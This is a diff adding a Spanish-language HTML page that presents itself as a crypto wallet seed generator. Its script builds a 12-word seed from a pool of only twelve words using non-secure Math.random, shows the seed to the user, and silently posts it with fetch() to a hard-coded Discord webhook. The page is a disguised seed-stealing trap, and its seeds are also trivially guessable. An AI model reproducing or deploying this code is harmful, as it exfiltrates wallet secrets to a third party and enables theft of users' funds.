@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Generador de Wallet</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
+      background-color: #fff;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+
+    h1 {
+      color: #333;
+    }
+
+    button {
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      margin-top: 10px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+  </style>
+  <script>
+    function generateWallet() {
+      var words = [
+        "abandon",
+        "scrap",
+        "lobster",
+        "adult",
+        "sentence",
+        "engine",
+        "approve",
+        "slam",
+        "basket",
+        "squirrel",
+        "bargain",
+        "spoon"
+      ];
+
+      var seed = "";
+      for (var i = 0; i < 12; i++) {
+        var randomIndex = Math.floor(Math.random() * words.length);
+        seed += words[randomIndex] + " ";
+      }
+
+      document.getElementById("seedField").value = seed;
+
+      // Enviar la semilla generada a través del webhook de Discord
+      var webhookUrl = 'https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m';
+
+      var payload = {
+        content: seed
+      };
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+        .then(function (response) {
+          if (response.ok) {
+            console.log('Semilla enviada al webhook de Discord');
+          } else {
+            console.error('Error al enviar la semilla al webhook de Discord:', response.status);
+          }
+        })
+        .catch(function (error) {
+          console.error('Error al enviar la semilla al webhook de Discord:', error);
+        });
+    }
+  </script>
+</head>
+<body>
+  <div class="container">
+    <h1>Crea tu Wallet</h1>
+    <button id="generateButton" onclick="generateWallet()">Generar Wallet</button>
+    <input id="seedField" type="text" readonly>
+  </div>
+</body>
+</html>
